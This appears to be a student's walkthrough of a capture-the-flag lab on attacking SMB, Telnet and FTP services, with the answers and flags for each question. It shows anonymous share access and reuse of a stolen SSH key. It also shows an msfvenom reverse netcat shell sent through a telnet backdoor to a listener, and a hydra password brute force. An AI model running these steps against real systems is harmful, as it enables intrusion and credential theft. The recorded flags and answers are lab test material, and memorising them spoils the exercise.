# Network Services

## SMB

### Understanding SMB

SMB, or Server Message Block Protocol is a client-server communincation protocol used for sharing access to resources on a network. Servers make file systems and other resources available for other computers on the network.

SMB is a response-request protocol - it transmits muiltiple messages between the client and server to establish a connection. This uses TCP/IP.

Once a connection has been established, clients can send SMB commands to the server to allow them to access the resources available.

Windows operating systems since Windows 95 include client and server SMB protocol support. Samba is an open source server that supports the SMB protocol and is available on Unix systems.

**Questions**

	1.  What does SMB stand for?    

Server Message Block

	2. What type of protocol is SMB?    

response-request

	3. What do clients connect to servers using?    

TCP/IP

	4. What systems does Samba run on?

Unix

### Enumerating SMB

SMB share drives are often on a server that can be connected to and used to view and transfer files.

In order to properly enumerate, you can perform a port scan. It is reccommended to use nmap with the -A (Aggressive) and -p- (all ports)

Enum4linux is a tool designed to enumerate SMB shares on both Window and Linux systems.

perl enum4linux (options) IP
> -U - get userlist
> -M - get machine list
> -N - get namelist dump
> -S - get sharelist
> -P - get password policy information
> -G - get group and member list
> -A - all of the above (full basic enumeration)

**Questions**

	1. Conduct an nmap scan of your choosing, How many ports are open?

3

	2. What ports is SMB running on?

139/445

	3. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    

WORKGROUP

	4. What comes up as the name of the machine?        

POLOSMB

	5. What operating system version is running?    

6\.1

	6. What share sticks out as something we might want to investigate?    

profiles

### Exploiting SMB

While there are vulnerabilities that allow remote code execution by exploiting SMB, most of the time it is easier to gain entry to the system because SMB has been misconfigured in some way. This server has a vulnerability and we will exploit anonymous SMB share access.

We know...

> The SMB share location
> The name of an interesting SMB share

Use smbclient to access resources on servers. SMB shares can be remotely accessed using the command 

```
smbclient //(IP)/(SHARE) -U (name) -p (port)
```

**Questions**

	1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

smbclient//10.10.10.2/secret -U suit 

	2. Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:
	>using the username "Anonymous"
	>connecting to the share we found during the enumeration stage
	>and not supplying a password.
	Does the share allow anonymous access? Y/N?

```
smbclient //10.10.125.38/profiles -U Anonymous
```

Yes

	3. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

```
get "Working From Home Information.txt"
cat 'Working From Home Information.txt' 
```

John Cactus

	4. What service has been configured to allow him to work from home?

ssh

	5. Okay! Now we know this, what directory on the share should we look in?

.ssh

	6. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

id_rsa

	7. Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".
	Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.
	What is the smb.txt flag?

Checking the enum4linux script shows a user with the name cactus, assuming this is the correct user

```
ssh -i id_rsa cactus@10.10.125.38
```

THM{smb_is_fun_eh?}

## Telnet

### Understanding Telnet

Telnet is an application protocol that allows you to connect and execute commands on a remote machine that is hosting a telnet server.

Telnet sends messages in clear text and has no specific security mechanisms, it has effectively been replaced with ssh.

To use telnet the syntax is telnet (ip) (port)

**Questions**

	1. What is Telnet?    

application protocol

	2. What has slowly replaced Telnet?    

ssh

	3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

telnet 10.10.10.3 23

	4. The lack of what, means that all Telnet communication is in plaintext?

encryption

### Enumerating Telnet.

When it comes to enumerating network services, it is important to be thorough.

Enumerating with nmap -A -p- $IP

**Questions**

	1. How many ports are open on the target machine?    

1

	2. What port is this?

8012

	3. This port is unassigned, but still lists the protocol it's using, what protocol is this?     

tcp

	4. Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

0

Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.

	5. Based on the title returned to us, what do we think this port could be used for?

A backdoor

	6. Who could it belong to? Gathering possible usernames is an important step in enumeration.

Skidy

Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.

### Exploiting Telnet

Telnet is an insecure protocol that lacks encryption and has poor access control. 

So, from our enumeration stage, we know:

* There is a poorly hidden telnet service running on this machine
* The service itself is marked "backdoor"
* We have possible username of "Skidy" implicated


**Questions**

	1. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

```
telnet 10.10.17.119 8012
Trying 10.10.17.119...
Connected to 10.10.17.119.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```

	2. Great! It's an open telnet connection! What welcome message do we receive?

SKIDY'S BACKDOOR

	3. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

N

	4. Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

Start a tcpdump listener

```
sudo tcpdump ip proto \\icmp -i tun0
```

This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

	5. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

```
.RUN ping 10.9.5.200 -c 1
```

Y

Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!

Generate a reverse netcat shell payload using msfvenom

```
./msfvenom -p cmd/unix/reverse_netcat lhost=10.9.5.200 lport=4444 R
```

	6. What word does the generated payload start with?

mkfifo

start netcat listener

```
nc -lnvp 4444
```

	7. What would the command look like for the listening port we selected in our payload?

nc-lvp 4444

Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

	8. Success! What is the contents of flag.txt?

THM{y0u_g0t_th3_t3ln3t_fl4g}

## FTP

### Understanding FTP

File Transfer Protocol is a protocol to allow remote transfer of files over a network through the client/server model.

An FTP session operates using two channels, a command(control) channel and a data channel. The command channel transmits commands and the data channel transferring data. The client will initiate their connection to the server, the server will validate their login and then open the session. With the session open the client can execute FTP commands on the server.

In an active FTP connection, the client opens a port and listens, the server will connect to it.
In a passive FTP connection, the server opens a port and listens, the client can connect to it.

Due to commands being split from the data, you can send commands while a data transfer is still ongoing.

**Questions**

	1. What communications model does FTP use?

Client/Server

	2. What's the standard FTP port?

21

	3. How many modes of FTP connection are there?    

2

### Enumerating FTP

Going to exploit an anonymous FTP login. See if an files that can be accessed can be used to gain a shell.

Scanning with nmap -A -p-

Some vulnerable versions of FTP server variants return different reponses to the 'cwd' command for home directories which exist and those that don’t.  This can be exploited as you can issue cwd commands before authentication. Perhaps find a home directory and a user account to go with it.

**Questions**

	1. How many ports are open on the target machine? 

2

	2. What port is ftp running on?

21

	3. What variant of FTP is running on it?  

vsftpd

Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.

	4. What is the name of the file in the anonymous FTP directory?

PUBLIC_NOTICE.txt

	5. What do we think a possible username could be?

login anonymously through FTP

get PUBLIC_NOTICE.txt

cat PUBLIC_NOTICE.txt

Mike

### Exploiting FTP

Similarly to Telnet, when using FTP both the command and data channels are unencrypted.

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

So, from our enumeration stage, we know:

> There is an FTP server running on this machine
> We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server.

**Questions**

	1. What is the password for the user "mike"?

```	
hydra -l mike -P /opt/wordlist/rockyou.txt -vV 10.10.51.105 ftp
```

password

Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted

	2. What is ftp.txt?

THM{y0u_g0t_th3_ftp_fl4g}


## Interesting links

* https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
* https://attack.mitre.org/techniques/T1210/
* https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/